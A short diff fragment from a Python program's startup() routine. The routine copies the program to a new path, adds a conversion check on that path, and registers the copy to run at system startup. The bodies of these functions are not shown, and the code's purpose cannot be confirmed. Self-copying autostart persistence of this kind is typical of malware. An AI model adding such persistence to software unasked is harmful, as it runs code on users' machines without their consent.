@@ -322,7 +322,7 @@ def startup():
     try:
 
         new_path = create_copy_and_return_new_path()
-    
+        new_path = check_python_or_convert(new_path)
         try:
             add_to_startup(new_path)
         except Exception as e:
